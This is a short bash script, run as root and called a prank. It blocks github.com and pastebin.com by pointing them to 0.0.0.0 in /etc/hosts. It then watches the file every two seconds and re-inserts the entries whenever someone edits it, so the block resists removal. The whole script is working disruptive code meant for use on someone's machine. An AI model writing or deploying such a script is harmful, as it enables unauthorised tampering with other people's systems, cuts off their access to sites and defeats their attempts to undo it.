#!/bin/bash
# prank_dns.sh - run with sudo

TARGETS=("github.com" "www.github.com" "pastebin.com" "www.pastebin.com")
HOSTS_FILE="/etc/hosts"
MARKER="rit.edu"
POLL_INTERVAL=2

apply_prank() {
    for domain in "${TARGETS[@]}"; do
        if ! grep -q "$domain $MARKER" "$HOSTS_FILE"; then
            echo "0.0.0.0 $domain $MARKER" >> "$HOSTS_FILE"
        fi
    done
}

get_hash() {
    md5sum "$HOSTS_FILE" | awk '{print $1}'
}

apply_prank
LAST_HASH=$(get_hash)

while true; do
    sleep "$POLL_INTERVAL"
    CURRENT_HASH=$(get_hash)

    if [[ "$CURRENT_HASH" != "$LAST_HASH" ]]; then
        apply_prank
        LAST_HASH=$(get_hash)
    fi
done